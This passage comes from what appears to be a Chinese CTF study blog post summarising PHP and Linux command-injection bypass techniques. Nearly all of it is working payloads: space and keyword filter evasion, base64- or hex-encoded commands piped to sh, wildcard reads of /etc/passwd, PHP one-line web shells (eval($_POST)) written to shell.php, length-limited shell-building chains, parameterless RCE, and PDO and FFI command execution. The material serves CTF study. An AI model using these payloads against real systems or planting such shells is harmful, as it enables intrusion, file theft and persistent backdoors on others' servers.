<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通用绕过</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line"><span class="comment">#linux下绕过</span></span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$1</span></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span></span><br><span class="line">&lt;     比如<span class="built_in">cat</span>&lt;a.tct:表示<span class="built_in">cat</span> a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line"><span class="comment">#windows环境下绕空格</span></span><br><span class="line">~<span class="number">10</span>,<span class="number">1</span>%</span><br><span class="line">~表示为截取符,该语句的含义为从第十个开始截取且获取一个字符串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以利用这种思路去写马</span><br><span class="line">eval(file_get_contents(<span class="string">&quot;php://input&quot;</span>));</span><br><span class="line"></span><br><span class="line">然后post</span><br><span class="line">fputs(fopen(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]); ?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>5)绕cat</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代替cat方法</span></span><br><span class="line"> cat</span><br><span class="line"> tac</span><br><span class="line"> more</span><br><span class="line"> less</span><br><span class="line"> head</span><br><span class="line"> tail</span><br><span class="line"> nl</span><br><span class="line"> sed</span><br><span class="line"> <span class="keyword">sort</span></span><br><span class="line"> uniq</span><br><span class="line"> rev</span><br><span class="line"> od%09<span class="string">`ls`</span> 利用转进制显示</span><br><span class="line"> <span class="comment">#代替空格的方法</span></span><br><span class="line"> IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</span><br><span class="line"> <span class="comment">#过滤了目录分隔符/ #利用cd执行到目录里后在进行绕</span></span><br><span class="line"> <span class="comment">#如</span></span><br><span class="line"> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>;cd flag_is_here;cat flag_5898818519729.php |base64</span><br><span class="line"> <span class="comment">#过滤了运算符|等</span></span><br><span class="line"> <span class="comment">#即不可以</span></span><br><span class="line"> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>;cd flag_297281061019145.php |base64</span><br><span class="line"> <span class="comment">#绕方法</span></span><br><span class="line"> base64 flag_297281061019145.php</span><br><span class="line">c=echo(<span class="string">`more%09f*`</span>);</span><br><span class="line"><span class="comment">#绕隔离符类--&gt;即|,;类</span></span><br><span class="line"><span class="comment">#可代这个--&gt;注意直接输入到url编码中,防止被转义</span></span><br><span class="line">%0a</span><br></pre></td></tr></table></figure>

<p>6)绕过关键字</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">①单引号和双引号绕过</span><br><span class="line">比如：<span class="keyword">ca</span>’&#x27;t flag 或<span class="keyword">ca</span><span class="string">&quot;&quot;</span>t flag</span><br><span class="line">②反斜杠绕过或者&lt;&lt;绕过</span><br><span class="line">比如：<span class="keyword">ca</span>\t <span class="keyword">fl</span>\ag <span class="keyword">ca</span>&lt;&lt;t</span><br><span class="line">③过滤目录分隔符 /</span><br><span class="line">可以使用;和<span class="keyword">cd</span>到目录然后使用<span class="keyword">cat</span>抓取</span><br><span class="line">④拼接绕过</span><br><span class="line">比如：a=<span class="keyword">l</span>;b=s;a aab</span><br><span class="line">a aab就代表<span class="keyword">ls</span></span><br><span class="line">⑤编码绕过</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">wh\o\ami    <span class="comment">//反斜线绕过</span></span><br><span class="line">who<span class="string">&quot;a&quot;</span>mi    <span class="comment">//双引号绕过</span></span><br><span class="line">whoa<span class="string">&#x27;m&#x27;</span>i    <span class="comment">//单引号绕过</span></span><br><span class="line">whoam``i    <span class="comment">//反引号绕过</span></span><br><span class="line"><span class="keyword">echo</span> d2hvYW1p|base64 -d|sh  <span class="comment">//base64绕过,其中d2hvYW1p是whoami的base64编码</span></span><br><span class="line"><span class="keyword">echo</span> d2hvYW1p|base64 -d|bash<span class="comment">//base64绕过,其中d2hvYW1p是whoami的base64编码</span></span><br><span class="line">`<span class="keyword">echo</span> d2hvYW1p|base64 -d` <span class="comment">//将其base64解码,然后用反引号来执行命令</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">77686</span>F616D69 | xxd -r -p | bash <span class="comment">//hex绕过,其中77686F616D69是whoami的hex编码</span></span><br><span class="line"><span class="comment">//$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:</span></span><br><span class="line">wh$<span class="number">1</span>oami</span><br><span class="line">who$@ami</span><br><span class="line">whoa$*mi</span><br><span class="line"><span class="comment">#⑥借助文件中其他文件的字符串进行绕</span></span><br><span class="line">如</span><br><span class="line">test.php中存在该命令</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hello，lemon&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">即可利用<span class="keyword">echo</span> `expr substr $(awk NR==<span class="number">1</span> test.php) <span class="number">1</span> <span class="number">1</span>`</span><br><span class="line">进行执行&lt;</span><br></pre></td></tr></table></figure>

<p>7)绕文件名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> <span class="built_in">fl</span>[<span class="type">abc</span>]g.php               <span class="comment">#匹配[abc]中的任何一个</span></span><br><span class="line"><span class="built_in">cat</span> f[<span class="type">a</span>-<span class="type">z</span>]ag.txt               <span class="comment">#匹配a-z范围的任何字符</span></span><br><span class="line"><span class="built_in">cat</span> fla*                       <span class="comment">#用*匹配任意</span></span><br><span class="line">a=f;d=ag;c=l;<span class="built_in">cat</span> <span class="variable">$a</span><span class="variable">$c</span><span class="variable">$d</span>.php 表示<span class="built_in">cat</span> flag.php <span class="comment">#内联执行</span></span><br><span class="line"><span class="comment">#利用正则:比如要读取etc/passwd</span></span><br><span class="line"><span class="built_in">cat</span> /???/??????</span><br><span class="line"><span class="built_in">cat</span> /???/pass*</span><br><span class="line"><span class="built_in">cat</span> /etc<span class="variable">$u</span>/passwd</span><br></pre></td></tr></table></figure>

<p>8)绕过滤了system</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">system</span>()<span class="comment">#有回显</span></span><br><span class="line">passthru()</span><br><span class="line"><span class="keyword">exec</span>()</span><br><span class="line">shell_exec()</span><br><span class="line">popen() </span><br><span class="line">proc_open() </span><br><span class="line">pcntl_exec() </span><br><span class="line"><span class="comment">#反引号 </span></span><br><span class="line">c=echo <span class="string">`cat f*`</span>;</span><br></pre></td></tr></table></figure>

<p>9)典型限制长度类rce执行</p>
<p>1.)15个字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>  \<span class="meta">&lt;?php</span> &gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>\(&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \<span class="variable">$_GET</span>&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \[<span class="number">1</span>\]&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \)\;&gt;&gt;<span class="number">1</span></span><br><span class="line">mv <span class="number">1</span> <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p>2.)7个字符</p>
<p> 1、命令+&gt;文件名可以生产文件(命令可以为空)<br> 2、ls -t可以将文件按时间顺序排列<br> 3、sh命令可以执行sh脚本<br> 4、base64命令可以避免特殊字符<br> 5、\可以分行输入命令</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w&gt;hp</span><br><span class="line">w&gt;1.p<span class="symbol">\w</span>&gt;d<span class="symbol">\&gt;</span><span class="symbol">\w</span>&gt;<span class="symbol">\ </span>-<span class="symbol">\w</span>&gt;e64<span class="symbol">\w</span>&gt;bas<span class="symbol">\w</span>&gt;7<span class="symbol">\|</span><span class="symbol">\w</span>&gt;XSk<span class="symbol">\w</span>&gt;Fsx<span class="symbol">\w</span>&gt;dFV<span class="symbol">\w</span>&gt;kX0<span class="symbol">\w</span>&gt;bCg<span class="symbol">\w</span>&gt;XZh<span class="symbol">\w</span>&gt;AgZ<span class="symbol">\w</span>&gt;waH<span class="symbol">\w</span>&gt;PD9<span class="symbol">\w</span>&gt;o<span class="symbol">\ </span><span class="symbol">\w</span>&gt;ech<span class="symbol">\l</span>s -t|sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>10)绕system(“ls”)</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#如果system(<span class="string">&quot;ls&quot;</span>)被过滤了</span><br><span class="line">可代php自带函数进行读取文件目录</span><br><span class="line">shana=var<span class="constructor">_dump(<span class="params">scandir</span>(“.”)</span>)?&gt;</span><br><span class="line">print<span class="constructor">_r(<span class="params">scandir</span>(&#x27;<span class="operator">/</span>&#x27;)</span>)</span><br><span class="line">var<span class="constructor">_export(<span class="params">scandir</span>(<span class="string">&quot;/&quot;</span>)</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>globx协议:查找匹配的文件路径模式</p>
<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226232717445.png" alt="image-20220226232717445"></p>
<h3 id="没字母数字RCE"><a href="#没字母数字RCE" class="headerlink" title="没字母数字RCE"></a>没字母数字RCE</h3><p>类型</p>
<p>①不用数字构造出数字类型<br>②不用数字和字母的shell<br>③非字母,数字的字符异或出字母<br>④非字母、数字的字符取反出字母<br>⑤php递增／递减运算符构造出shell<br>⑥不用数字字母下划线和$的shell–&gt;即典型短标签的思路(即直接在短标签中构造常见的shell命令即可)</p>
<p>基础知识点</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">短标签</span></span><br><span class="line"><span class="xml">#如</span></span><br><span class="line"><span class="xml"></span><span class="php"><span class="meta">&lt;?=</span>`ls /`;<span class="meta">?&gt;</span></span><span class="xml">      # 等效于</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls /`; <span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml">原理:</span><span class="php"><span class="meta">&lt;?=</span> 是 <span class="keyword">echo</span>() 的别名用法</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span><span class="php"><span class="meta">&lt;?=</span>`ls`;   <span class="comment">#构造原因&lt;?= 还是不够的，需要先 ?&gt;</span></span><span class="xml"> 把前面的 </span><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">临时文件上传</span></span><br><span class="line"><span class="php"><span class="comment">#原理:们都知道php文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方</span></span></span><br><span class="line"><span class="php"><span class="comment">#php.ini中的两个参数</span></span></span><br><span class="line"><span class="php">file_uploads 是否允许上传</span></span><br><span class="line"><span class="php">upload_tmp_dir 是默认的临时文件的保存目录（linux默认为/tmp）</span></span><br><span class="line"><span class="php"><span class="comment">#临时文件保存形式</span></span></span><br><span class="line"><span class="php">默认为 php+<span class="number">4</span>或者<span class="number">6</span>位随机数字和大小写字母</span></span><br><span class="line"><span class="php">如</span></span><br><span class="line"><span class="php">phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">?c=.+/???/????????[@-[]</span></span><br><span class="line"><span class="php">+:空格的意思，也可以用空格编码%<span class="number">20</span> 空格 + %<span class="number">20</span> 都可以表示空格</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="number">123</span>为<span class="number">1</span>.txt的内容  然后在上传文件内容添加sh命令          </span></span><br><span class="line"><span class="php"><span class="comment">#!/bin/sh</span></span></span><br><span class="line"><span class="php">ls</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">linux命令执行的另外一种方式</span></span><br><span class="line"><span class="php">原理:linux环境下执行命令可以以文件形式存在</span></span><br><span class="line"><span class="php">如aa.txt文件中--&gt;cat /etc/passwd</span></span><br><span class="line"><span class="php">即可./aa.txt执行这个命令</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">linux通配符</span></span><br><span class="line"><span class="php"></span></span><br></pre></td></tr></table></figure>

<p>临时文件上传</p>
<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226234043869.png" alt="image-20220226234043869"></p>
<p>一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p>
<p>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。<code>$(())</code>的值是0   如果b=<del>a，那么a+b=-1。若a=0,</del>0=-1</p>
<p>$((~$(())))   ~0=-1</p>
<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><p><strong>无参数</strong>的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，<strong>不能带参数</strong></p>
<p><strong>print_r(scandir(‘.’))</strong></p>
<p>可以用来查看当前目录所有文件名</p>
<p>但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</p>
<p>​         <strong>scandir() 函数返回指定目录中的文件和目录的数组</strong></p>
<ul>
<li>localeconv()  函数返回一包含本地数字及货币格式信息的数组。</li>
<li>current()        函数返回数组中的当前元素（单元）,默认取第一个值，</li>
<li>pos() 同 current()  ,是current()的别名</li>
<li>reset()   函数返回数组第一个单元的值，如果数组为空则返回 FALSE</li>
<li>array_reverse()逆转数组函数</li>
<li>next()函数进行下一个值的读取</li>
<li>ord()返回字符串中第一个字符的Ascii值</li>
<li><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220124140605804.png" alt="image-20220124140605804"></li>
<li>readgzfile()也可读文件，常用于绕过过滤</li>
<li>dirname() ：返回路径中的目录部分</li>
<li>chdir() ：改变当前工作目录</li>
<li>array_flip() 函数用于反转/交换数组中的键名和对应关联的键值。</li>
<li>array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</li>
<li>show_source() 函数对文件进行语法高亮显示。</li>
<li>highlight_file() 函数对文件进行语法高亮显示。</li>
<li>readfile() 函数读取一个文件，并写入到输出缓冲。</li>
</ul>
<p>​         **localeconv() ** 函数 返回数组的第一项就是 .  (小数点)<img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220124144510476.png" alt="image-20220124144510476"></p>
<p>我们可以通过读取该小数点代替print_r(scandir(‘.’))中的小数点 ，读取数组第一项可以的函数有current()、pos() 、reset()</p>
<p>所以最终我们可以构造如下：查看当前目录所有文件名</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">pos</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">reset</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure>

<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">dirname</span>(<span class="params">getcwd</span>()</span>))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure>

<h2 id="0x04-综合利用类"><a href="#0x04-综合利用类" class="headerlink" title="0x04 综合利用类"></a>0x04 综合利用类</h2><p>典型拼接写木马</p>
<p>利用拼接执行写一句话木马</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">127.0.0.1 &amp;echo &quot;</span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot; &gt;&gt; shell.php#没过滤空格和典型的关键字时可用</span></span><br><span class="line"><span class="xml">127.0.0.1 | cat 3122542822583.php |base64#即拼接进行base64显示,典型用于直接cat不出来的情况下</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>



<h3 id="命令执行无回显绕过"><a href="#命令执行无回显绕过" class="headerlink" title="命令执行无回显绕过"></a>命令执行无回显绕过</h3><p><strong>&gt;/dev/null 2&gt;&amp;1</strong>主要意思是不进行回显的意思</p>
<p><strong>1、可以将/dev/null看作”黑洞”. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong><br>用处:<br>禁止标准输出.  1 cat $filename &gt;/dev/null  # 文件内容丢失，而不会输出到标准输出.<br>禁止标准错误.   2&gt;/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. </p>
<p><strong>2、1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
<p>&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
<p><strong>那么:</strong><br>1&gt;/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 </p>
<p>3、/dev/zero文件代表一个永远输出 0的设备文件，使用它作输入可以得到全为空的文件。因此可用来创建新文件和以覆盖的方式清除旧文件。 </p>
<p>下面使用dd命令将从zero设备中创建一个10K大小（bs决定每次读写1024字节，count定义读写次数为10次），但内容全为0的文件。<br>dd if=/dev/zero of=file count=10 bs=1024</p>
<p> shell中可能经常能看到：<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">&gt;/dev/null 2&gt;&amp;1</a> </p>
<p>命令的结果可以通过%&gt;的形式来定义输出</p>
<p>分解这个组合：“&gt;/dev/null 2&gt;&amp;1” 为五部分。</p>
<p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”</p>
<p><strong>因此，&gt;<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">/dev/null 2&gt;&amp;1</a> 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</strong></p>
<p>要让命令回显，那么进行命令分隔即可</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	<span class="regexp">//</span>分号</span><br><span class="line">|	<span class="regexp">//</span>只执行后面那条命令</span><br><span class="line">||	<span class="regexp">//</span>只执行前面那条命令</span><br><span class="line">&amp;	<span class="regexp">//</span>两条命令都会执行</span><br><span class="line">&amp;&amp;	<span class="regexp">//</span>两条命令都会执行</span><br></pre></td></tr></table></figure>

<h2 id="其他姿势："><a href="#其他姿势：" class="headerlink" title="其他姿势："></a>其他姿势：</h2><p>include 无法使用，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下：</p>
<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
<p>在<strong>PDO</strong>中，我们可以使用三种方式来执行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>，分别是 exec()方法，query方法，以及预处理语句prepare()和execute()方法</p>
<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220220163455540.png" alt="image-20220220163455540"></p>
<p>exec()方法返回执行SQL 语句后受影响的行数，其语法格式如下：</p>
<p>参数 satatement 是要执行的SQL语句，该方法返回执行SQL 语句时受影响的行数，通常用于 INSERT，DELETE和UPDATE语句中</p>
<p>query()方法用于返回执行查询后的结果集，该函数的语法格式如下如下：</p>
<p>参数 satatement 是要执行的 SQL语句，它返回的是一个PODStatement对象！</p>
<p>注意:</p>
<p>1、query和exec都可以执行所有的sql语句，只是返回值不同而已。</p>
<p>2、query可以实现所有exec的功能。</p>
<p>3、当把select语句应用到 exec 时，总是返回 0</p>
<p>4、如果要看查询的具体结果，可以通过foreach语句完成循环输出</p>
<p>第三种种方法：预处理语句：prepare()语句和execute()语句</p>
<p>预处理语句包括prepare()和execute()两种方法。首先，通过prepare()方法做查询准备工作，然后通过execute()方法执行查询，并且还可以通过bindParam()方法来绑定参数给execute()方法</p>
<p><strong>php中的“-&gt;”符号</strong>被称为箭头<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%90%E7%AE%97%E7%AC%A6&spm=1001.2101.3001.7020">运算符</a>，箭头运算符左侧是获取类的实例，右侧将指定左侧类的方法和属性并进行<strong>调用</strong></p>
<p><strong>FFI</strong></p>
<p>外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。 </p>
<p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/133809650">https://zhuanlan.zhihu.com/p/133809650</a></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br><span class="line">readflag是专门用来读flag的。然后访问`/<span class="number">1</span>.txt`即可</span><br></pre></td></tr></table></figure>

<p>system函数：<br>原型：int system(const char * command)；<br>功能：执行 dos(windows系统) 或 shell(Linux/Unix系统) 命令，参数字符串command为命令名;<br>说明：在windows系统中，system函数直接在控制台调用一个command命令。在Linux/Unix系统中，system函数会调用fork函数产生子进程，由子进程来执行command命令，命令执行完后随即返回原调用的进程；</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/STUDY/" rel="tag"># STUDY</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="prev" title="CTF文件包含漏洞总结">
                  <i class="fa fa-chevron-left"></i> CTF文件包含漏洞总结
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/02/28/PHP%E7%89%B9%E6%80%A7/" rel="next" title="PHP特性">
                  PHP特性 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CJ</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Symbols count total">492k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">7:28</span>
  </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
